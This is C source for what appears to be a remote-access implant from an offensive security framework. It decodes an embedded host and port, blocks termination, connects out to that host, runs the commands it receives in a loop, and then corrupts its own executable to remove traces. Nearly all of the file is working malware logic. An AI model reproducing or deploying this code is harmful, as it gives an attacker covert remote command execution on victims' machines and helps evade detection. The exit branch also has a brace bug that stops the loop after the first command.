/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>

#include "json.h"
#include "utils.h"
#include "base64.h"

#include "channel.h"
#include "handler.h"

char data[64] = ":data:string:";

void interact(int channel)
{
    while (1) {
        char *input = read_channel(channel);
        JSONObject *json = parseJSON(input);

        char *cmd = find_json(json, "cmd");
        char *args = find_json(json, "args");
        char *token = find_json(json, "token");

        if (strcmp(cmd, "exit") == 0)
            send_channel(channel, token);
            break;

        handle_command(channel, cmd, args);
        send_channel(channel, token);
    }
}

int main(int argc, char *argv[])
{
    prevent_termination();

    char *input = decode_base64(data);
    JSONObject *json = parseJSON(input);

    char *host = find_json(json, "host");
    char *port = find_json(json, "port");

    int channel = open_channel(host, atoi(port));
    if (channel < 0)
        return -1;

    interact(channel);
    close_channel(channel);

    self_corrupt(argv[0]);
    return 0;
}
